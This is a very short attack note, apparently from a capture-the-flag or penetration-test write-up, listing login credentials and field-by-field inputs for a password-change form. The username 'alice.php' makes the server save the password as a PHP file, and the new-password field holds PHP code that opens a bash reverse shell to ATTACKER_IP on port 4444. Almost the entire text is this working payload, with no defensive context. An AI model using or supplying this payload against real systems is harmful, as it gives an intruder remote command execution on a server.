User-> alice:abc123

Payload:

into Username: alice.php

into Old password: abc123

into New password (remove space between < and ?): RAW:< ?php exec("/bin/bash -c 'exec 5<>/dev/tcp/ATTACKER_IP/4444; cat <&5 | while read line; do \$line 2>&5 >&5; done'");?>